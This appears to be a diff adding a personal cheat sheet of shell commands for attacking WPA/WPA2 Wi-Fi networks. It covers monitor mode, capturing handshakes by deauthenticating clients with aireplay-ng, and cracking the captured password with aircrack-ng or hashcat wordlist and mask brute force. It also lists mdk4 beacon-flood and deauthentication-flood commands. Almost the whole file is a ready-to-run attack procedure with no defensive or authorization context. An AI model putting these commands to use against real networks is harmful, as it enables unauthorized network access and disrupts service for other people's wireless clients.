@@ -1,0 +1,109 @@
+# ================================================================
+#
+# Hacking WPA/WPA2 network attacking AP, deauthenticating a client
+#
+# ================================================================
+
+# Check network interface device supports monitor and injection mode
+
+
+# Kill processes that affect the network interface device
+airmon-ng check kill
+
+systemctl stop NetworkManager
+systemctl stop wpa_supplicant
+
+
+# Start monitor mode 
+
+airmon-ng start wlo1
+
+iwconfig     # to check if monitor mode is enabled 
+
+
+# Get bssid or MAC of AP
+
+airodump-ng wlo1mon
+
+
+# 1st window
+
+airodump-ng -w psk -c <channel> --bssid <bssid> wlo1mon
+
+
+# 2nd window
+
+aireplay-ng -0 1 -a <bssid> -c <client mac> wlo1mon
+
+
+# Stop monitor mode 
+
+airmon-ng stop wlo1mon
+
+
+# TO-DO THEN:
+
+- OPTION 1
+
+# Crack password with wordlist 
+
+aircrack-ng psk-01.cap -w wordlist.txt
+
+
+- OPTION 2
+
+# (preparation, obtain dumpfile.pcapng (similar as psk-01.cap))
+# without deathenticating
+
+systemctl stop NetworkManager
+systemctl stop wpa_supplicant
+
+hcxdumptool -i wlo1 -o dumpfile.pcapng --active_beacon --enable_status=15
+
+systemctl start NetworkManager
+systecmtl start wpa_supplicant
+
+
+# CONTINUE (crack password using hashcat)
+
+hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
+
+
+hashcat -m 22000 hash.hc22000 worlist.txt
+
+hashcat -m 22000 hash.hc22000 -1 "?d?l?u" -a 3 --increment --increment-min 8 --increment-max 18 "?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1"
+
+# Once hash is found, execute the same command with --show parameter (to show password of course)
+
+
+
+# ================================================================
+#
+# MDK4 Beacon attack
+#
+# ================================================================
+
+# NIC must be in monitor mode
+
+mdk4 wlo1mon b -s 1000 
+	
+
+
+# ================================================================
+#
+# MDK4 Deauth
+#
+# ================================================================
+
+# NIC must be in monitor mode
+
+mdk4 wlo1mon d -c <channel>
+
+mdk4 wlo1mon d -bssid <bssid>
+
+options:
+	-w generate encrypted networks
+	-m use valid AP (access point) MAC from OUI database
+	-s set  speed in packets per second
+	-f <filename> read ssid from file
+
